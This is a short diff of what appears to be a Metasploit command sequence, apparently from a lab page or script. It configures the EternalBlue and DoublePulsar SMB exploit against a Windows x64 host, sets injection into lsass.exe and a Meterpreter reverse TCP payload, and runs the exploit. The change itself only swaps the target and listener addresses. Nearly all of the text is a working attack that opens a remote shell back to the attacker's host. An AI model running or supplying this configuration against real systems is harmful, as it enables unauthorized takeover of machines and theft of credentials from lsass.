@@ -18,12 +18,12 @@ set DOUBLEPULSARPATH /usr/share/metasploit-framework/modules/exploits/windows/sm
 set ETERNALBLUEPATH /usr/share/metasploit-framework/modules/exploits/windows/smb/deps
 set PROCESSINJECT lsass.exe
 set TARGETARCHITECTURE  x64
-set rhost 192.168.2.204
+set rhost 192.168.12.111
 show targets
 set target 8
 set payload windows/x64/meterpreter/reverse_tcp
 show options
-set lhost 192.168.2.202
+set lhost 192.168.12.110
 
 exploit
 </pre>
